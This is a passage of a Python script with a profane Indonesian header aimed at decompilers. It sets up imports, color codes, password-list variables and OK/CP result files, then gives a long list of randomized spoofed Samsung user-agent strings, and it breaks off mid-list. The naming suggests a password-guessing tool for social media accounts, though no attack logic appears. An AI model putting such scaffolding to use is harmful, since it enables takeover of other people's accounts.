#TUKANG DEC ANJING GA TAU BERSYUKUR DI KASIH GRATIS KOK DI DEC ANAK LONTE BABI
#AUTHOR      : HENDRIAN SETIAWAN, BAYU PUTRA TAMA, NIZAM, NUGRAHA PRANATA, SHOLEH, REHAN, DAPA, ECHA
#TEAM           : KEYBOARD WARRIORS
#MEMBER     : HENDRIAN SETIAWAN, BAYU PUTRA TAMA, NIZAM, NUGRAHA PRANATA, SHOLEH, REHAN, DAPA, ECHA
#THANKS TO GOOD DON'T FORGET TO GIFT STARS IN MY GITHUB
#GITHUB       : https://github.com/A7X-VOLDIGOAD
#FACEBOOK : NUGRAHA PRANATA|Nugraha Pranata 18/03/1998 :) 3:)

try:
	import re
	import os
	import sys
	import bs4
	import json
	import time
	import base64
	import random
	import datetime
	import requests
	ses = requests.Session()
	from time import time as waktunya
	from bs4 import BeautifulSoup as sop
	from time import time as mek
	from concurrent.futures import ThreadPoolExecutor as tred
except ImportError as e:
	exit(e)

try:
	import rich
	from rich.text import Text
	from rich.tree import Tree
	from rich.table import Table
	from rich.table import Column
	from rich import print as cetak
	from rich.table import Table
	from rich.columns import Columns
	from rich.console import Console
	console = Console()
	from rich.text import Text
	from rich.panel import Panel as nel
	from rich.markdown import Markdown as mark
	from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
except ImportError as e:
	exit(e)

P = '\33[m'
m = '\x1b[0;91m'
K = '\033[0;93m'
H = '\x1b[0;92m'
b = '\x1b[0;34m'
O = "\x1b[0;96m" # Biru Muda

u,akun,uid,id,id2,metode,loop,ok,cp = [],[],[],[],[],[],0,0,0
ugent,apk = [],[]
pwpluss,pwnya=[],[]
uz,ugen,ugen2 = [],[],[]

ori = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
day = datetime.datetime.now().day
month = ori[(str(datetime.datetime.now().month))]
years = datetime.datetime.now().year

okc = 'OK-'+str(day)+'-'+str(month)+'-'+str(years)+'.txt'
cpc = 'CP-'+str(day)+'-'+str(month)+'-'+str(years)+'.txt'
##############################
reyrun = random.randint
reyUaSpecial = [f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G990B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G9730) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G781U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A136U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S326DL) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A225M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A326U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G525F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S908U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G986B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G975U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A307G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G770F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-F926U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G996N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A102W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S906N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J737T1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G781V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-F711U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S906U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 7.1.1; SAMSUNG SM-T550) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; 2107113SG) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N986U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G990B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G9730) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G781U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A136U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S326DL) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A225M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A326U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 8.0.0; PRA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G525F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S908U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G986B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G975U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A307G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G770F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-F926U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G996N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A102W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S906N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J737T1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G781V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-F711U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S906U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 7.1.1; SAMSUNG SM-T550) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; 2107113SG) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N986U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G990B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G9730) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 